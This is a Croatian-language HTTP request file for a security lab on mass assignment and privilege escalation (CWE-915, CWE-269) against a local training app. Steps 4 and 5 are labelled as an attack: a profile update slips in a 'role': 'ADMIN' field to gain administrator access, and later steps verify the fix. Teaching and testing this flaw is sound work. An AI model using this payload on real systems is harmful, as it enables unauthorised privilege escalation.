### =====================================================================
### Lab02 – A01: Mass assignment / eskalacija privilegija (CWE-915, CWE-269)
### Upute: docs/labs/lab02-mass-assignment.md
### =====================================================================
@host = http://localhost:5080
@token = ZALIJEPITE_TOKEN_OVDJE

### 1) Prijava kao marko (kopirajte "token" u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "marko", "password": "Marko123!"}

### 2) Markov profil – uloga USER
GET {{host}}/api/lab02/profile
Authorization: Bearer {{token}}

### 3) Marko još nema pristup administraciji – očekivano 403
GET {{host}}/api/lab02/admin/users
Authorization: Bearer {{token}}

### 4) NAPAD: uz legitimna polja marko dodaje i "role": "ADMIN"
PUT {{host}}/api/lab02/profile
Authorization: Bearer {{token}}
Content-Type: application/json

{"displayName": "Marko", "email": "m@x.hr", "role": "ADMIN"}

### 5) NAPAD (nastavak): sada dobiva popis svih korisnika (ranjivo: 200)
GET {{host}}/api/lab02/admin/users
Authorization: Bearer {{token}}

### 6) PROVJERA POPRAVKA: nakon koraka 4) profil i dalje ima "role": "USER", a korak 5) vraća 403
GET {{host}}/api/lab02/profile
Authorization: Bearer {{token}}

### 7) PROVJERA VALIDACIJE (nakon popravka): neispravna e-pošta → 400
PUT {{host}}/api/lab02/profile
Authorization: Bearer {{token}}
Content-Type: application/json

{"displayName": "Marko", "email": "ovo-nije-email"}
